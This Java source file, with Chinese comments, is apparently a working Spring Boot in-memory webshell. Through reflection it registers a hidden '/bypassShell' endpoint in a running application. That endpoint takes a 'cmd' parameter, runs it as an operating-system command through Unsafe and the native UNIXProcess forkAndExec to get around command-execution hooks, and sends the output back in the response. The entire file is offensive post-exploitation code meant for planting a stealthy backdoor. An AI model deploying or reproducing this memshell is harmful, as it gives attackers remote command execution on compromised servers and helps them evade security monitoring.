package com.just;

import org.springframework.web.context.WebApplicationContext;
import org.springframework.web.context.request.RequestContextHolder;
import org.springframework.web.servlet.mvc.condition.RequestMethodsRequestCondition;
import org.springframework.web.servlet.mvc.method.RequestMappingInfo;
import org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;
import sun.misc.Unsafe;

import javax.servlet.ServletOutputStream;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.InputStream;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.Arrays;
import java.util.Map;

public class SpringBoot3Memshell {
    public SpringBoot3Memshell() {
        WebApplicationContext context = (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute("org.springframework.web.servlet.DispatcherServlet.CONTEXT", 0);
        RequestMappingHandlerMapping mappingHandlerMapping = context.getBean(RequestMappingHandlerMapping.class);
        Field configField = null;
        try {
            configField = mappingHandlerMapping.getClass().getDeclaredField("config");
        } catch (NoSuchFieldException e) {
            throw new RuntimeException(e);
        }
        configField.setAccessible(true);
        RequestMappingInfo.BuilderConfiguration config = null;
        try {
            config = (RequestMappingInfo.BuilderConfiguration) configField.get(mappingHandlerMapping);
        } catch (IllegalAccessException e) {
            throw new RuntimeException(e);
        }
        Method method2 = null;
        try {
            method2 = SpringBoot3Memshell.class.getMethod("evilFunc", HttpServletRequest.class, HttpServletResponse.class);
        } catch (NoSuchMethodException e) {
            throw new RuntimeException(e);
        }
        RequestMethodsRequestCondition ms = new RequestMethodsRequestCondition();
        // 选择自己要注入的path
        RequestMappingInfo info = RequestMappingInfo.paths("/bypassShell")
                .options(config)
                .build();
        SpringBoot3Memshell evilController = new SpringBoot3Memshell("XXX");
        mappingHandlerMapping.registerMapping(info, evilController, method2);
    }

    public SpringBoot3Memshell(String aaa){}

    public void evilFunc(HttpServletRequest request, HttpServletResponse response) throws Exception {
        // 获取命令
        String[] cmds = request.getParameterValues("cmd");

        // 获取Unsafe类对象
        Class<?> unsafeClass = Class.forName("sun.misc.Unsafe");
        Constructor<?> unsafeConstructor = unsafeClass.getDeclaredConstructor();
        unsafeConstructor.setAccessible(true);
        Unsafe unsafe = (Unsafe) unsafeConstructor.newInstance();

        // 通过Unsafe绕过构造方法创建UNIXProcess类的实例对象
        Class<?> unixProcessClass = Class.forName("java.lang.UNIXProcess");
        Object unixProcessObject = unsafe.allocateInstance(unixProcessClass);

        // 从UNIXProcess中通过反射获取forkAndExec方法需要的参数（前两个参数是静态属性，可以直接反射获取）：1. ordinal. 2. helperpath. 3. argBlock
        Field launchMechanismField = unixProcessClass.getDeclaredField("launchMechanism");
        Field helperpathField = unixProcessClass.getDeclaredField("helperpath");

        launchMechanismField.setAccessible(true);
        helperpathField.setAccessible(true);

        Object launchMechanismObject = launchMechanismField.get(unixProcessObject);
        int ordinal = (int) launchMechanismObject.getClass().getSuperclass().getDeclaredMethod("ordinal").invoke(launchMechanismObject);
        byte[] helperpath = (byte[]) helperpathField.get(unixProcessObject);

        // 根据cmds计算argBlock
        int length = 0;
        byte[] argBlock = new byte[length];
        for (int i = 1; i < cmds.length; i++) {
            byte[] cString = toCString(cmds[i]);
            byte[] tmp = new byte[length + cString.length];
            System.arraycopy(argBlock, 0, tmp, 0, length);
            System.arraycopy(cString, 0, tmp, length, cString.length);
            argBlock = tmp;
            length += cString.length;
        }

        int[] std_fds = new int[] {-1,-1,-1};

        // 这个获取forkAndExec的方式会获取到新的，也就是假的forkAndExec方法。
//        Method forkAndExec = unixProcessClass.getDeclaredMethod("forkAndExec", int.class, byte[].class, byte[].class, byte[].class, int.class, byte[].class, int.class, byte[].class, int[].class, boolean.class);
        // 获取真实的forkAndExec方法并调用这个方法
        Method forkAndExec = null;
        Method[] methods = unixProcessClass.getDeclaredMethods();
        boolean flag = false;
        for (Method method : methods) {
            if (method.getName().endsWith("forkAndExec") && !method.getName().equals("forkAndExec")) {
                flag = true;
                System.out.println("find real forkAndExec: " + method.getName());
                forkAndExec = method;
            }
        }
        if (!flag) {
            System.out.println("real forkAndExec not found");
            return;
        }
        forkAndExec.setAccessible(true);
        int pid = (int) forkAndExec.invoke(unixProcessObject, ordinal + 1, helperpath, toCString(cmds[0]), argBlock, cmds.length - 1, null, 0, null, std_fds, false);
        System.out.println("pid = " + pid);

        // 初始化命令执行结果，将本地命令执行的输出流转换为程序执行结果的输出流
        Method initStreamsMethod = unixProcessClass.getDeclaredMethod("initStreams", int[].class);
        initStreamsMethod.setAccessible(true);
        initStreamsMethod.invoke(unixProcessObject, std_fds);

        // 获取本地执行结果的输入流
        Method getInputStreamMethod = unixProcessClass.getMethod("getInputStream");
        getInputStreamMethod.setAccessible(true);
        InputStream ins = (InputStream) getInputStreamMethod.invoke(unixProcessObject);

        // 将结果返回到页面上
        ServletOutputStream os = response.getOutputStream();
        int len;
        byte[] buffer = new byte[1024];
        while ((len = ins.read(buffer)) != -1) {
            os.write(buffer, 0, len);
        }

        os.close();
        ins.close();
    }

    public byte[] toCString(String source) {
        byte[] src = source.getBytes();
        byte[] result = new byte[src.length + 1];
        System.arraycopy(src, 0, result, 0, src.length);
        result[result.length - 1] = (byte) 0;
        return result;
    }
}